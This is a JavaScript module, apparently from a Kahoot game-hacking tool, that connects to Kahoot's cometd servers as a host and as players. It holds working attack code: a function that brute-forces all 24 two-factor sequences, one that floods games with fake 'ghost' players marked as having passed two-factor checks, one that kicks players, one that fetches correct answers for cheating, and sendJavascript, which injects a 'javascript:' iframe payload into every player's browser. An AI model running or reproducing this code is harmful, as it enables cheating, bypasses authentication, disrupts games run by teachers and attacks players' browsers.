import $ from "jquery/dist/jquery.min.js";
import cometd from "./cometd.js";
import * as config from "@/config.json";

const proxy = config.corsUrl + ":" + config.corsPort + "/";
const clientEvents = {
    getReady: 1,
    startQuestion: 2,
    gameOver: 3,
    timeUp: 4,
    playAgain: 5,
    answerSelected: 6,
    answerResponse: 7,
    revealAnswer: 8,
    startQuiz: 9,
    resetController: 10,
    submitFeedback: 11,
    feedback: 12,
    revealRanking: 13,
    userNameAccepted: 14,
    userNameRejected: 15,
    requestRecoveryDataFromPlayer: 16,
    sendRecoveryDataToController: 17,
    joinTeamMembers: 18,
    joinTeamMembersResponse: 19,
    startTeamTalk: 20,
    skipTeamTalk: 21,
    iframeControllerEvent: 31,
    serverIframeMessage: 32,
    storyBlockGetReady: 40,
    reactionSelected: 41,
    reactionResponse: 42,
    gameBlockStart: 43,
    gameBlockEnd: 44,
    gameBlockAnswer: 45,
    submitTwoFactorAuth: 50,
    twoFactorAuthIncorrect: 51,
    twoFactorAuthCorrect: 52,
    resetTwoFactorAuth: 53
};

class KahootPlayer {
    constructor(name, isGhost, cid, kahootSession) {
        this.name = name;
        this.cid = cid;
        this.isGhost = isGhost;
        this.kahootSession = kahootSession;
        this.cometd = kahootSession.cometd;
        this.pin = kahootSession.pin;
    }

    sendRaw(rawMessage, callback) {
        rawMessage = rawMessage[0];
        rawMessage.data.gameid = this.pin;
        this.cometd.publish(rawMessage.channel, rawMessage.data, callback);
    }

    send(channel, data, callback) {
        data.host = "kahoot.it";
        data.gameid = this.pin;
        this.cometd.publish(channel, data, callback);
    }

    sendGameAnswer(answerId) {
        this.send("/controller/" + this.pin, {
            id: clientEvents.gameBlockAnswer,
            type: "message",
            cid: this.cid,
            content: JSON.stringify({
                choice: answerId,
                meta: {
                    lag: 15,
                    device: {
                        userAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/61.0.3163.79 Chrome/61.0.3163.79 Safari/537.36",
                        screen: {
                            width: 1440,
                            height: 870
                        }
                    }
                }
            })
        });
    }

    sendTeam(names) {
        this.send(
            "/controller/" + this.pin, {
                id: clientEvents.joinTeamMembers,
                type: "message",
                cid: this.cid,
                content: JSON.stringify(names)
            },
            function (publishAck) {}
        );
    }

    removeFromGame() {
        this.send("/controller/" + this.pin, {
            type: "left",
            cid: this.cid,
            client: "dviide.xyz"
        });
    }
}

class KahootClient {
    constructor(pin, name, url = "https://www.kahoot.it") {
        this.pin = pin;
        this.name = name;
        this.apiUrl = proxy + url;
        this.cometdUrl = "wss://kahoot.it/cometd";
        this.cometd = null;
        this.answers = null;
        this.questionNum = null;
        this.solvedChallenge;
        this.session;
        this.clientId;
        this.rawSession;
        this.error;

        this.onRawMessageController = function (m) {};
        this.onRawMessagePlayer = function (m) {};
        this.onRawMessageStatus = function (m) {};
    }

    initialize(callback) {
        const self = this;
        this.testSession(function (error) {
            if (!error) {
                self.createWebsocket(function (error) {
                    if (!error) {
                        self.doLogin(function () {
                            callback(null);
                        });
                    } else {
                        callback(error);
                    }
                });
            } else {
                callback(error);
            }
        });
    }

    disconnect(callback) {
        this.cometd.disconnect(callback);
    }

    send(channel, data, callback) {
        data.host = "play.kahoot.it";
        data.gameid = this.pin;
        this.cometd.publish(channel, data, callback);
    }

    bruteForceTwoFactor() {
        let combinations = [
            "0123",
            "0132",
            "0213",
            "0231",
            "0321",
            "0312",
            "1023",
            "1032",
            "1203",
            "1230",
            "1302",
            "1320",
            "2013",
            "2031",
            "2103",
            "2130",
            "2301",
            "2310",
            "3012",
            "3021",
            "3102",
            "3120",
            "3201",
            "3210"
        ];
        for (let i = 0; i < combinations.length; i++) {
            this.twoFactorLogin(combinations[i]);
        }
    }

    twoFactorLogin(code) {
        this.send(
            "/service/controller", {
                id: clientEvents.submitTwoFactorAuth,
                type: "message",
                cid: this.cid,
                gameid: this.pin,
                host: "kahoot.it",
                content: JSON.stringify({
                    sequence: code
                })
            },
            function (publishAck) {}
        );
    }

    addPlayer(name, isGhost, cid) {
        this.send("/controller/" + this.pin, {
            type: "joined",
            cid: cid,
            image: "dviide.xyz",
            name: name,
            isGhost: isGhost,
            completedTwoFactorAuth: 1
        });

        return new KahootPlayer(name, isGhost, cid, this);
    }

    doLogin(callback) {
        this.send(
            "/service/controller", {
                gameid: this.pin,
                host: "kahoot.it",
                name: this.name,
                type: "login"
            },
            function () {
                if (typeof callback === "function") {
                    callback(true);
                }
            }
        );
    }

    createWebsocket(callback) {
        const self = this;
        this.cometd = new cometd.CometD();
        this.cometd.configure({
            url: this.cometdUrl + "/" + this.pin + "/" + this.session
        });
        this.cometd.websocketEnabled = true;
        this.cometd.handshake(function (h) {
            if (h.successful) {
                self.cometd.subscribe(
                    "/service/controller",
                    function (m) {
                        self.onRawMessageController(m);
                        if (m.data.error) {
                            callback(m.data.description);
                        }
                    }
                );
                self.cometd.subscribe("/service/player", function (
                    m
                ) {
                    self.onRawMessagePlayer(m);
                    let tempJson;

                    switch (m.data.id) {
                        case clientEvents.getReady:
                            tempJson = JSON.parse(m.data.content);
                            self.questionNum = tempJson.questionIndex;
                            break;

                        case clientEvents.startQuiz:
                            tempJson = JSON.parse(m.data.content);
                            self.quizName = tempJson.quizName;
                            break;
                    }
                });
                self.cometd.subscribe("/service/status", function (
                    m
                ) {
                    self.onRawMessageStatus(m);
                });
                callback(null);
            } else {
                callback(
                    "Session could not get parsed! This happens from time to time, just retry!"
                );
            }
        });
    }

    testSession(callback) {
        const self = this;
        $.ajax({
            url: this.apiUrl +
                "/reserve/session/" +
                this.pin +
                "/?" +
                KahootHelper.getTC(),
            success: function (response, _, req) {
                if (req.status !== 404) {
                    self.rawSession = req.getResponseHeader(
                        "x-kahoot-session-token"
                    );
                    self.solvedChallenge = KahootHelper.solveChallenge(
                        response.challenge
                    );
                    self.twoFactor = response.twoFactorAuth;
                    self.session = KahootHelper.shiftBits(
                        self.rawSession,
                        self.solvedChallenge
                    );
                    callback(null);
                } else {
                    callback("Game not found!");
                }
            },
            error: function () {
                callback("Game not found!");
            }
        });
    }
}

class KahootServer {
    constructor() {
        this.pin;
        this.uuid;
        this.quiz;
        this.cometd;
        this.message = () => {};

        this.players = [];
        this.options = {
            gameMode: "normal",
            twoFactorAuth: false,
            namerator: false
        };
    }

    sendRaw(rawMessage, callback) {
        rawMessage = rawMessage[0];
        rawMessage.data.gameid = this.pin;
        this.cometd.publish(rawMessage.channel, rawMessage.data, callback);
    }

    send(channel, data, callback) {
        data.host = "play.kahoot.it";
        data.gameid = this.pin;
        this.cometd.publish(channel, data, callback);
    }

    sendJavascript(script) {
        this.send("/service/player", {
            type: "message",
            id: 2,
            content: JSON.stringify({
                questionIndex: 1,
                quizType: "quiz",
                quizQuestionAnswers: [1],
                iframeSrc: "javascript:" + script + "; //"
            })
        });
    }

    initialize(callback) {
        const self = this;

        this.reservePin(function (response) {
            self.pin = parseInt(response);

            self.reserveSession(response, function (
                response,
                _,
                req
            ) {
                const challenge = KahootHelper.solveChallenge(
                    response.challenge
                );
                const rawSession = req.getResponseHeader(
                    "x-kahoot-session-token"
                );
                const session = KahootHelper.shiftBits(rawSession, challenge);
                self.cometd = new cometd.CometD();

                self.cometd.configure({
                    url: "wss://play.kahoot.it/cometd/" +
                        self.pin +
                        "/" +
                        session
                });

                self.cometd.websocketEnabled = true;
                self.cometd.handshake(function (h) {
                    if (h.successful) {
                        self.cometd.subscribe("/service/player", function (m) {
                            self.message(m);
                        });

                        self.cometd.subscribe(
                            "/controller/" + self.pin,
                            function (m) {
                                self.message(m);

                                if (m.data.type === "joined") {
                                    self.send("/service/player", {
                                        cid: "0",
                                        content: JSON.stringify({
                                            playerName: m.data.name,
                                            quizType: "quiz"
                                        })
                                    });
                                }
                            }
                        );

                        self.send(
                            "/service/player", {
                                type: "started"
                            },
                            function () {
                                callback(null, self.pin);
                            }
                        );
                    }
                });
            });
        });
    }

    reservePin(callback) {
        $.ajax({
            url: proxy +
                "https://play.kahoot.it/reserve/session/?" +
                KahootHelper.getTC(),
            method: "POST",
            data: JSON.stringify(this.options),
            success: callback
        });
    }

    reserveSession(pin, callback) {
        $.ajax({
            url: proxy +
                "https://play.kahoot.it/reserve/session/" +
                pin +
                "/?" +
                KahootHelper.getTC(),
            method: "GET",
            success: callback
        });
    }
}

class KahootHelper {
    static getTC() {
        return new Date().getTime();
    }

    static getGameAnswers(gameName, bearerToken, callback) {
        const self = this;
        if (!this.answers) {
            this.searchGames(gameName, bearerToken, function (
                response
            ) {
                if (response.status === 401) {
                    callback("Not authorized. Please relog!");
                    localStorage.removeItem("bearerToken");
                } else {
                    let answers = [];
                    let currEntity = 0;
                    if (response.totalHits > 0) {
                        for (let e = 0; e < response.entities.length; e++) {
                            if (response.entities[e].title === gameName) {
                                currEntity = e;
                            }
                        }
                        response = response.entities[currEntity];
                        for (let i = 0; i < response.questions.length; i++) {
                            for (
                                let a = 0; a < response.questions[i].choices.length; a++
                            ) {
                                if (
                                    response.questions[i].choices[a].correct ===
                                    true
                                ) {
                                    answers[i] = {
                                        questionNum: i,
                                        question: response.questions[i].question,
                                        answer: response.questions[i].choices[a],
                                        answerNum: a
                                    };
                                }
                            }
                        }
                        self.answers = answers;
                        callback(null, answers);
                    } else {
                        callback("No answers were found. This can happen if the kahoot is private.");
                    }
                }
            });
        } else {
            callback(null, self.answers);
        }
    }

    static searchGames(gameName, bearerToken, callback) {
        let headers = {
            Authorization: "Bearer " + bearerToken
        };

        $.ajax({
            method: "GET",
            url: proxy +
                "https://create.kahoot.it/rest/kahoots/search/public?query=" +
                gameName.replace(/[.,\/#!$%\^&\*;:{}=\-_`~()]/g, "") +
                "&limit=100" +
                "&_=" +
                new Date().getTime(),
            headers: headers,
            success: callback,
            error: callback
        });
    }

    static getGame(gameUUID, bearerToken, callback) {
        let headers = {
            Authorization: "Bearer " + bearerToken
        };

        $.ajax({
            method: "GET",
            url: proxy +
                "https://play.kahoot.it/rest/kahoots/" +
                gameUUID +
                "?_=" +
                this.getTC(),
            headers: headers,
            success: callback
        });
    }

    //getBearerToken - gets bearer token by loggin in to kahoot, returns (callback) object
    static getBearerToken(username, password, callback) {
        let formData = "";
        let headers = {
            "x-kahoot-login-gate": "enabled",
            "Content-Type": "application/json"
        };

        formData = {
            username: username,
            password: password,
            grant_type: "password"
        };

        formData = JSON.stringify(formData);

        $.ajax({
            method: "POST",
            url: proxy + "https://create.kahoot.it/rest/authenticate",
            data: formData,
            headers: headers,
            success: function (response, _, req) {
                if (req.status !== 401) {
                    if (typeof callback === "function") {
                        if (response.access_token) {
                            callback(null, {
                                bearerToken: response.access_token,
                                expiration: response.expires
                            });
                        } else {
                            callback(
                                "Auth failed, wrong username or password!"
                            );
                        }
                    }
                } else {
                    if (typeof callback === "function") {
                        callback("Auth failed, wrong username or password!");
                    }
                }
            },
            error: function (_, __, req) {
                if (req.status !== 401) {
                    if (typeof callback === "function") {
                        callback("Auth failed, wrong username or password!");
                    }
                }
            }
        });
    }

    static shiftBits(session, challenge) {
        const sessionBytes = this.convertDataToBinary(atob(session));
        const challengeBytes = this.convertDataToBinary(challenge);
        const bytesList = [];
        for (let i = 0; i < sessionBytes.length; i++) {
            bytesList.push(
                String.fromCharCode(
                    sessionBytes[i] ^ challengeBytes[i % challengeBytes.length]
                )
            );
        }
        return bytesList.join("");
    }

    static convertDataToBinary(raw) {
        const rawLength = raw.length;
        const tempArray = new Uint8Array(new ArrayBuffer(rawLength));

        for (let i = 0; i < rawLength; i++) {
            tempArray[i] = raw.charCodeAt(i);
        }
        return tempArray;
    }

    static solveChallenge(challenge) {
        let toDecode = challenge.split("'")[1].split("'")[0];
        const offset = eval(challenge.split("var offset = ")[1].split(";")[0]);
        const decodeMod = parseInt(
            challenge
            .split(") % ")[1]
            .split(")")[0]
            .trim()
        );
        const decodePlus = parseInt(
            challenge
            .split(decodeMod)[1]
            .split("+ ")[1]
            .split(")")[0]
        );
        let final = "";

        for (let i = 0; i < toDecode.length; i++) {
            const char = toDecode[i];
            final += String.fromCharCode(
                ((char.charCodeAt(0) * i + offset) % decodeMod) + decodePlus
            );
        }

        return final;
    }

    static waitForSocketConnection(socket, callback) {
        setTimeout(function () {
            if (socket.readyState === 1) {
                if (typeof callback === "function") {
                    callback();
                }
                return;
            } else {
                waitForSocketConnection(socket, callback);
            }
        }, 5);
    }
}

export {
    KahootClient,
    KahootServer,
    KahootHelper,
    proxy
};
